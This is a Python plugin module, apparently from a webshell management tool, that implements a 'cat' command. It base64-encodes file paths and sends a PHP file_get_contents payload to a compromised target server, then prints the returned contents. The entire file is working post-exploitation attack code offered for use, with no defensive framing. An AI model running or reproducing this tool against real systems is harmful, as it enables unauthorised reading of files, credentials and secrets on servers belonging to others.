from libs.config import alias, color
from libs.myapp import send, base64_encode


@alias(True, func_alias="c", _type="FILE")
def run(*web_file_paths):
    """
    cat

    Read file(s) from target system.

    eg: cat {web_file_path1} {web_file_path2} ..
    """
    for each_file_path in web_file_paths:
        res = send(f"print(file_get_contents(base64_decode('{base64_encode(each_file_path)}')));")
        if (not res):
            return
        text = res.r_text.strip()
        if len(text):
            print("\n" + color.green(each_file_path))
            print("\n" + text + "\n")
        else:
            print("\n" + color.yellow(each_file_path))
            print("\n" + color.red("File not exist / Read error") + "\n")
